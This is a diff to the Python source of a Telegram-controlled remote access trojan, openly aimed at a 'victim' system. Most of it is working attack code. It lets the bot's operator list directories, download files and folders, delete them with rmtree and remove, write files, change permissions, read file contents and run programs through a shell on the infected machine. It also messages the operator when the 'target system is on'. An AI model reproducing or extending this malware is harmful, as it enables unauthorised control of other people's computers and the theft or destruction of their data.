@@ -4,10 +4,14 @@ import shutil
 from requests.exceptions import ConnectionError
 import subprocess
 
+
+
 bot=telebot.TeleBot("")
-chatids=["",""]
+chatids=[""]
 @bot.message_handler(commands=['start'])
 def start(message):
+    # global directory
+    # directory=os.getcwd()
     bot.reply_to(message,"Welcome to the hacking world!")
     #Add chat id to which you wanna want to send info of users using your bot.....
     for i in chatids:
@@ -17,19 +21,31 @@ def start(message):
     # User name=@{message.chat.username}
     # User id={message.chat.id}
     # User's first name={message.chat.first_name}''')
+@bot.message_handler(commands=['pwd'])
+def pwd(message):
+    try:
+        bot.reply_to(message,os.getcwd())
+    except:
+        bot.reply_to(message,"You are not in any directory.")
+
+@bot.message_handler(commands=['cd'])
+def chdir(message):
+    bot.reply_to(message,"Enter your directory:")
+    bot.register_next_step_handler(message,cd)
+def cd(message):
+    try:
+        os.chdir(message.text)
+        bot.send_message(message.chat.id,f"Directory changed to {os.getcwd()}")
+    except:
+        bot.reply_to(message,"No such directory found.")
 @bot.message_handler(commands=['ls'])
 def ls(message):
-    bot.reply_to(message,"Enter the directory name of victim folder:")
-    bot.register_next_step_handler(message,hack)
-
-def hack(message):
-    dir=message.text
-    bot.reply_to(message,f"Getting access to {message.text}.Please wait.....")
+    bot.reply_to(message,f"Getting access to {os.getcwd()}.Please wait.....")
     try:
-        list=os.listdir(dir)
+        list=os.listdir(os.getcwd())
 
         for i in list:
-            if os.path.isdir(f"{dir}/{i}"):   
+            if os.path.isdir(f"{os.getcwd()}/{i}"):   
                 bot.send_message(message.chat.id,f"dir--{i}")
             else:
                 bot.send_message(message.chat.id,i)
@@ -39,12 +55,12 @@ def hack(message):
 
 @bot.message_handler(commands=['file'])
 def file(message):
-    bot.reply_to(message,"Enter the file path:")
+    bot.reply_to(message,f"Enter the file name of {os.getcwd()}:")
     bot.register_next_step_handler(message,filefetch)
 def filefetch(message):
     bot.reply_to(message,"Fetching...Please wait......")
     try: 
-        with open(message.text,"rb") as f:
+        with open(f"{os.getcwd()}/{message.text}","rb") as f:
             bot.send_document(message.chat.id,f)
         bot.reply_to(message,"File successfully fetched.")
     except:
@@ -53,13 +69,13 @@ def filefetch(message):
 
 @bot.message_handler(commands=['files'])
 def files(message):
-    bot.reply_to(message,"Enter the directory path:")
+    bot.reply_to(message,f"Enter the directory name of {os.getcwd()}:")
     bot.register_next_step_handler(message,filesfetch)
 def filesfetch(message):
     bot.reply_to(message,"Fetching files...Please wait......")
     try:
-        for i in os.listdir(message.text):
-            with open(f"{message.text}/{i}","rb") as f:
+        for i in os.listdir(f"{os.getcwd()}/{message.text}"):
+            with open(f"{os.getcwd()}/{message.text}/{i}","rb") as f:
                 bot.send_document(message.chat.id,f)
         bot.reply_to(message,f"Files of {message.text} successfully fetched.")
     except:
@@ -67,27 +83,27 @@ def filesfetch(message):
 
 @bot.message_handler(commands=['rmr'])
 def deleteFolder(message):
-    bot.reply_to(message,"Please enter the full path of directory....")
+    bot.reply_to(message,f"Please enter name of directory of {os.getcwd()}....")
     bot.register_next_step_handler(message,rmr)
 def rmr(message):
     try:
-        shutil.rmtree(message.text)
+        shutil.rmtree(f"{os.getcwd()}/{message.text}")
         bot.reply_to(message,f"{message.text} successfully gone.Check it by checking path: /check_path")
     except:
         bot.reply_to(message,"Folder doesn't exists or inaccessible.")
 @bot.message_handler(commands=['rm'])
 def deleteFile(message):
-    bot.reply_to(message,"Please enter the full path of File....")
+    bot.reply_to(message,f"Please enter the name of the file of {os.getcwd()}....")
     bot.register_next_step_handler(message,rm)
 def rm(message):
     try:
-        os.remove(message.text)
+        os.remove(f"{os.getcwd()}/{message.text}")
         bot.reply_to(message,f"{message.text} successfully gone.Check it by checking path: /check_path")
     except:
         bot.reply_to(message,"File doesn't exists or inaccessible.")
 @bot.message_handler(commands=['check_path'])
 def checkpath(message):
-    bot.reply_to(message,"Enter your path: ")
+    bot.reply_to(message,"Enter your full path: ")
     bot.register_next_step_handler(message,check)
 def check(message):
     try:
@@ -105,8 +121,8 @@ def create(message):
 def vim(message):
     try:
         global filename
-        filename=message.text
-        with open(message.text,"w") as f:
+        filename=f"{os.getcwd()}/{message.text}"
+        with open(f"{os.getcwd()}/{message.text}","w") as f:
             f.writelines("Null")
         bot.reply_to(message,"Enter content:")
         bot.register_next_step_handler(message,write)
@@ -128,16 +144,44 @@ print("Bot Started.....")
 
 @bot.message_handler(commands=['execute'])
 def exec(message):
-    bot.reply_to(message,"Enter your file path")
+    bot.reply_to(message,f"Enter your executable file name of {os.getcwd()}")
     bot.register_next_step_handler(message,execute)
 def execute(message):
     try:
         # os.system(message.text)
-        subprocess.run([message.text], shell=True)
+        subprocess.run([f"{os.getcwd()}/{message.text}"], shell=True)
         bot.reply_to(message,"Execution successful.")
     except:
         bot.reply_to(message,"Execution Unsuccessful")
 
+@bot.message_handler(commands=['chmod'])
+def changemod(message):
+    bot.reply_to(message,f"Enter the permission and name of file of {os.getcwd()} (example:755 main.sh)")
+    bot.register_next_step_handler(message,chmod)
+def chmod(message):
+    list=message.text.split(" ")
+    file_path=f"{os.getcwd()}/"+list[1]
+    permission=int(list[0],8)
+    # print(list)
+    try:
+        os.chmod(file_path, permission)
+        bot.reply_to(message,"Permission Updated....")
+    except:
+        bot.reply_to(message,"Permission can't be changed.")
+
+@bot.message_handler(commands=['cat'])
+def concatinate(message):
+    bot.reply_to(message,"Enter your file name:")
+    bot.register_next_step_handler(message,cat)
+def cat(message):
+    try:
+        with open(f"{os.getcwd()}/{message.text}","r") as f:
+            content=f.read()
+        bot.send_message(message.chat.id,f'''
+File content:
+{content}''')
+    except:
+        bot.repyl_to(message,"file is inaccessible.")
 #Add below the chatid's to which you wanna forward alart when victic is online.
 for j in chatids:
     bot.send_message(j,"Target system is on......")
